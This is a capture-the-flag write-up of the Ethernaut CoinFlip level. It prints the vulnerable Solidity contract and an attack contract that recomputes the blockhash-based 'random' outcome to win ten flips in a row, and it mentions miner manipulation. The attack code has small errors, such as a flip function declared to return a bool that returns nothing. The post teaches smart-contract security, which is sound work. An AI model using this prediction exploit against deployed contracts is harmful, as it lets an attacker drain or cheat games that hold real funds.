+++
title = "CoinFlip - Ethernaut"
date = "2022-01-15"
author = "DimitrisV"
+++

Coin flip is a basic game that we throw a coin and we have 50\% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff: 
 ``` 
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
Computers are unable to generate true random numbers. Computers are combining different things in order to create numbers that people can't predict easily. But, if we repeat the process that computer followed to generate the random number, we will end up with that number. Ethereum is not providing any function for random numbers. As a result, programmers have to create their own functions for randomness or to use Oracles to import random numbers outside the Ethereum Network . As the Coin-Flip game smart-contract needed randomness, the programmer imported the Safemath library to protect it from underflows and it used a long uint256 number in the FACTOR variable. 

In terms of Libraries, libraries are restricted in following ways:
* They cannot have state variables.
*  They cannot inherit nor be inherited.
*  They cannot receive Ether.
*  They cannot be destroyed.

So, we have the public function flip on the smart-contract CoinFlip. We can see they call the blockchash  in order to create a hash of one of the given blocks. From Solidity's documentation, we know that blockhash can only work for the 256 most recent blocks. On account of that, in the variable blockValue, we store the blockhash of the current block number, and then they divide by the long number which is stored in variable "FACTOR".
 Then, it returns a Boolean result. So as we know the process of creation of the random number, what if we try to repeat the process of constructing this "random" number in our malicious smart-contract and then send the pseudo-anonymous result as our "guess"?
   
  
```  
 // SPDX-License-Identifier: MIT 
pragma solidity ^0.8.11;

//import the original smart-contact

import "./CoinFlip.sol";


contract CoinFlipAttack {

    CoinFlip public victimContract;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _victimContractAddr) public {
        victimContract= CoinFlip(_victimContractAddr);

    }

//reproduce the function flip, but for the previous block, as the last block has been mined.
    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip= uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true: false;
        victimContract.flip(side);

}
}
```

  
In our own smart-contract, we reproduced the function flip but we modified the blockhash function to use the previous block as an input, as block has already been mined. Now we are ready to compile and deploy our malicious smart-contract which is ready to fool the original smart-contract. All we have to do is just to spam our cheat function 10 times, until we reach  10 consecutive wins.
However, as we can understand now, there is an another vulnerability here. As miners build them up with different transactions and they compete between themselves to commit their block to Ethereum's Blockchain, miners are able to exercise their judgement when building up blocks. A miner with the appropriate time, could try many different guesses and not commit blocks where he was mistaken. This one of the consequences of Proof Of Work based consensus mechanism, in the process of achieving a really random number. 


---
If you want to learn more about Smart Contract Security, please check our paper and eCourses:
## Smart-Contract Security:

- [Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas](https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf)


* [Smart Contract Security - Educational YouTube Series in Greek - Click Here](https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7)
